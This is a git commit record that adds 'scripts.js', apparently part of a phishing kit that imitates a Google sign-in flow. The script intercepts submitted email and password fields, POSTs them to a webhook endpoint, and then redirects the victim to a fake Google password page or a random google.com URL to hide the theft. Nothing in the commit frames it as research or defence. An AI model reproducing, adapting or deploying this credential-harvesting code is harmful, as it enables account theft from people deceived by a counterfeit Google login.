d9574c93f0cb252d23e47f1483cbfbff824a6e44
TceYGAA <TceYGAA@proton.me>
2025-03-15 17:30:12 +0000

    Add files via upload

---
+++ scripts.js
@@ -0,0 +1,55 @@
+const webhook = "webhook";
+
+const sendToWebhook = async (body) => {
+  const response = await fetch(webhook, {
+    method: "POST",
+    body: JSON.stringify(body),
+  });
+
+  return response;
+};
+
+function handleSubmitRR(event, form) {
+  event.preventDefault();
+  const data = new FormData(event.target);
+  const email = data.get("mail");
+  const password = data.get("p");
+
+  (async function () {
+    await sendToWebhook({ email: email, password: password });
+    form.submit();
+  })();
+}
+
+function handleSubmitPassword(event) {
+  event.preventDefault();
+  const data = new FormData(event.target);
+  const password = data.get("password");
+
+  (async function () {
+    await sendToWebhook({ password: password });
+    window.location.href =
+      "https://www.google.com/account/" + Math.floor(Math.random() * 1000000);
+  })();
+}
+
+function handleSubmitEmail(event) {
+  event.preventDefault();
+  const data = new FormData(event.target);
+  const email = data.get("email");
+
+  (async function () {
+    await sendToWebhook({ email: email });
+    window.location.href = "../google_password/google.html";
+  })();
+}
+
+function showSpinner() {
+  const showbox = document.querySelector(".showbox");
+  showbox.style.display = "flex";
+}
+
+function hideSpinner() {
+  const showbox = document.querySelector(".showbox");
+  showbox.style.display = "none";
+}
